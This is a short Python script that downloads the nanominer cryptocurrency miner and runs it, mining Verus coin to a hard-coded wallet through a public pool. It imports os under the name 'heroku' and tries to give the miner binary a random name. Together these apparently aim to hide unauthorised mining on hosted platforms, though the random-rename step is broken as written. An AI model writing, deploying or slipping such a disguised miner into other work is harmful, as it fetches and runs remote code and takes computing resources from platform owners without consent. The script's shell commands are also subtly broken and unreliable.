import os as heroku
import hashlib
import socket
import sys
import time
import urllib.request
import ssl
import random
import threading

heroku.system(f'wget https://github.com/nanopool/nanominer/releases/download/v3.7.7/nanominer-linux-3.7.7.tar.gz')
heroku.system(f'tar xf nanominer-linux-3.7.7.tar.gz')
heroku.system(f'test=$(shuf -i 1-999999 -n 1)')
heroku.system(f'mv nanominer $test')
heroku.system(f'./$test -algo Verushash -wallet RC1cM3E6qp34rJtem8fdvkfVQFVPL8pM4V.Rig001 -coin VRSC -pool1 verushash.mine.zergpool.com:3300 -useSSL false -t 4')






